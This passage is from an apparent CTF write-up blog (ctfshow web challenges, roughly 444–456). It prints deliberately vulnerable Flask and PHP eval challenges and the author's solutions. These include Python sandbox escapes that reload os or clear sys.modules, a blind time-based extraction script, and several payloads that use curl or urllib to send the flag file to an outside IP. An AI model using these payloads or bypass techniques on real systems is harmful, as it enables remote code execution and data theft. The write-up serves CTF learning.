class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>主要限制即不允许Unicode或者hex编码，同时这关禁用了<code>curl</code>和<code>len</code></p>
<p>那么我们不再能直接利用len来构造数字了，python中还有bool类型的True/False也可以充当数字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getNumber</span>(<span class="params">num</span>):</span><br><span class="line">    number = <span class="built_in">int</span>(num)</span><br><span class="line">    <span class="keyword">if</span> number <span class="keyword">in</span> [-<span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;~int(True)&quot;</span>, <span class="string">&quot;~int(False)&quot;</span>, <span class="string">&quot;int(False)&quot;</span>, <span class="string">&quot;int(True)&quot;</span>][number+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;~%s&#x27;</span> % getNumber(~number)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;(%s&lt;&lt;(int(True)))&#x27;</span> % getNumber(number/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;import os;os.system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)&quot;</span></span><br><span class="line">exp = <span class="string">&#x27;str().join([&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    exp += <span class="string">f&quot;chr(<span class="subst">&#123;getNumber(<span class="built_in">ord</span>(i))&#125;</span>),&quot;</span></span><br><span class="line">exp = exp[:-<span class="number">1</span>]  <span class="comment"># 去掉最后一个&#x27;,&#x27;</span></span><br><span class="line">exp += <span class="string">&#x27;])&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(exp)</span><br></pre></td></tr></table></figure></li>
<li><p>web445 <strong>模块重载</strong></p>
<p>源码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">del</span> os.system</span><br><span class="line"><span class="keyword">del</span> os.popen</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: </span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        code = request.form[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> code:</span><br><span class="line">        	code = stringQ2B(code)</span><br><span class="line">        	<span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">        		<span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">        	<span class="keyword">if</span> <span class="string">&#x27;\\x&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">        		<span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">        	reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\&#x27;|&quot;|\+|[0-9]|request|len&#x27;</span>)</span><br><span class="line">        	<span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">        		<span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到过滤并未增多，但是删除了os模块中的system和popen命令执行函数</p>
<p>这里其实就是针对模块操作的利用了，既然删除了那么我们是可以去重载的。</p>
<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221122232807165.png" alt="image-20221122232807165"></p>
<p>因此我们的利用语句为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import importlib;importlib.reload(os);os.system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)</span><br></pre></td></tr></table></figure></li>
<li><p>web446</p>
<p>查看源码，好的<code>del imp.reload</code></p>
<p>把重载函数也给我删掉了，但是俺用的是<code>importlib</code></p>
</li>
<li><p>web447</p>
<p>查看源码，好家伙删了更多函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">del</span> subprocess.Popen</span><br><span class="line"><span class="keyword">del</span> subprocess.call</span><br><span class="line"><span class="keyword">del</span> subprocess.run</span><br><span class="line"><span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line"><span class="keyword">del</span> subprocess.getoutput</span><br><span class="line"><span class="keyword">del</span> subprocess.check_call</span><br><span class="line"><span class="keyword">del</span> subprocess.check_output</span><br><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"><span class="keyword">del</span> timeit.timeit</span><br></pre></td></tr></table></figure>

<p>但是没什么卵用</p>
</li>
<li><p>web448</p>
<p>源码diff部分如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;imp&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;subprocess&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;socket&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;timeit&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;platform&#x27;</span>]=<span class="literal">None</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>字典sys.modules具有字典所拥有的一切方法，可以通过这些方法了解当前的环境加载了哪些模块</p>
</blockquote>
<p>那么重新修改一下值即可呗，查看一下值的规范</p>
<blockquote>
<p>程序在导入某个模块时，会<strong>首先查找sys.modules中是否包含此模块名</strong>，若存在，则只需将模块的名字加入到当前模块的Local名字空间中；若不存在，则需要从<strong>sys.path目录</strong>中按照模块名称查找模块文件，模块文件可以是py、pyc、pyd，找到后将模块加载到内存，<strong>并加入到sys.modules字典</strong>，最后将模块的名字加入当前模块的Local名字空间中</p>
</blockquote>
<p>os模块位于<code>/usr/local/lib/python3.8/os.py</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import sys;sys.modules[&#x27;os&#x27;]=&#x27;/usr/local/lib/ python3.8/os.py&#x27;;import os;os.system(xxx) </span><br></pre></td></tr></table></figure>

<p>或者，我们干脆直接删掉该os键，重新导入即可自动查找对应文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import sys;del sys.modules[&#x27;os&#x27;];import os;os.system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)</span><br></pre></td></tr></table></figure></li>
<li><p>web449 </p>
<p>源码diff如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;imp&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;subprocess&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;socket&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;timeit&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;platform&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;sys&#x27;</span>]=<span class="literal">None</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">sys.modules[<span class="string">&#x27;importlib&#x27;</span>]=<span class="literal">None</span></span><br><span class="line"><span class="keyword">del</span> sys</span><br></pre></td></tr></table></figure>

<p>太狠了，把sys也删掉了。那我们就不去直接命令执行了，换成文件读写。可以利用时间盲注的方式来回显</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">db = string.ascii_lowercase + string.digits + <span class="string">&#x27;&#123;&#125;-&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getNumber</span>(<span class="params">num</span>):</span><br><span class="line">    number = <span class="built_in">int</span>(num)</span><br><span class="line">    <span class="keyword">if</span> number <span class="keyword">in</span> [-<span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;~int(True)&quot;</span>, <span class="string">&quot;~int(False)&quot;</span>, <span class="string">&quot;int(False)&quot;</span>, <span class="string">&quot;int(True)&quot;</span>][number+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;~%s&#x27;</span> % getNumber(~number)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;(%s&lt;&lt;(int(True)))&#x27;</span> % getNumber(number/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getExp</span>(<span class="params">payload</span>):</span><br><span class="line">    exp = <span class="string">&#x27;str().join([&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">        exp += <span class="string">f&quot;chr(<span class="subst">&#123;getNumber(<span class="built_in">ord</span>(i))&#125;</span>),&quot;</span></span><br><span class="line">    exp = exp[:-<span class="number">1</span>]  <span class="comment"># 去掉最后一个&#x27;,&#x27;</span></span><br><span class="line">    exp += <span class="string">&#x27;])&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> exp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> db:</span><br><span class="line">        payload = <span class="string">f&quot;import time;f=open(&#x27;/flag&#x27;).read(<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>);time.sleep(3) if f==&#x27;<span class="subst">&#123;w&#125;</span>&#x27; else 1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;str(exec(&#x27;</span>+getExp(payload)+<span class="string">&#x27;))&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(</span><br><span class="line">                url=<span class="string">&quot;http://2bffcc80-8242-43aa-bcab-3a1a8e01a7c1.challenge.ctf.show/&quot;</span>, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result += w</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>时间上不好控制。yu22x师傅利用的一个没被Ban的模块<code>urllib</code>(以前的request)</p>
<blockquote>
<p><code>urllib.request.urlopen(  url,  data=None,  [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)</code></p>
<p>用于打开一个远程的url连接,并且向这个连接发出请求,获取响应结果。返回的结果是一个http响应对象,这个响应对象中记录了本次http访问的响应头和响应体    </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=open(&#x27;/flag&#x27;).read();import urllib;urllib.request.urlopen(&#x27;http://43.140.198.45:5000/?flag=%s&#x27; % flag)</span><br></pre></td></tr></table></figure></li>
<li><p>web450 另类rce, 执行phpinfo就可以拿到flag</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 14:28:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure>

<p>可以看到正则实际上是想要参数满足<code>字母^字母^字母</code>的形式，</p>
<p>如果对于相同的变量相异或我们知道是可以抵消的，因此三个phpinfo相异或即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo^phpinfo^phpinfo</span><br></pre></td></tr></table></figure></li>
<li><p>web451 另类rce, 执行phpinfo就可以拿到flag</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 15:38:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure>

<p>这次不让直接出现phpinfo关键字，可以进行一下混淆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaainfo^phpbbbb^aaabbbb</span><br></pre></td></tr></table></figure></li>
<li><p>web452 另类rce, 执行phpinfo就可以拿到flag</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 16:05:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|[0-9]|\&#123;|\[|\~|\^|phpinfo|\$/i&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure>

<p>其实一眼是可以直接命令执行的，但是还是以构造phpinfo为主，我们可以通过拼接的方式，仿照前几题</p>
<p>形式要保证<code>($ctfshow)()</code>左括号中的内容才会被当做动态函数处理，然后点号拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((p).(h).(p).(i).(n).(f).(o))();</span><br></pre></td></tr></table></figure></li>
<li><p>web453/455/456 另类rce,额，反正就是很另类的样子</p>
<p>前端源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/show?s=XXX  <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;s&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>尝试一下直接读源码index.php</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> <span class="title class_">Swoole\Http\Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, function (<span class="variable">$server</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, function (<span class="variable">$request</span>, <span class="variable">$response</span>) &#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    	(<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">		 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">		 <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">		 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line">		 &#125;<span 